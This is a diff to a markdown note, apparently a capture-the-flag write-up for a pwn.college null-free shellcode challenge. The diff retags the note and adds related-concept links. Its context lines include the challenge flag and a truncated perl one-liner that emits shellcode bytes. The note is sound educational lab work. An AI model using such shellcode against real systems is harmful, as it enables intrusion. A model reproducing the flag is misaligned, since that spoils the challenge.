@@ -4,8 +4,9 @@ Tittle: NULL-Free Shellcode
 Date & Tme: 2026 - 09 - 07 10:37
 tags:
   - Challenge
-  - ShellcodeInjection
-  - BinaryExploitation
+  - Shellcode-Crafting
+  - Null-Free
+  - Register-Zeroing
 ---
 ---
 ## FLAG : `pwn.college{0qLPDigvVgeflv65Blv--pE1_8M.dlTMywiN4kDOyEzW}`
@@ -63,3 +64,6 @@ perl -e 'print "\xeb\x2f\x5f\x6a\x02\x58\x48\x31\xf6\x0f\x05\x66\x81\xec\xef\x0f
 ### Key Takeaways : 
 - The last byte won't need \x00
 
+---
+## Related Concepts : 
+[[Basic Shellcode]], [[Shellcode Database]], [[Assembly - Logic & Bitwise]], [[Assembly - Registers]], [[perl]]
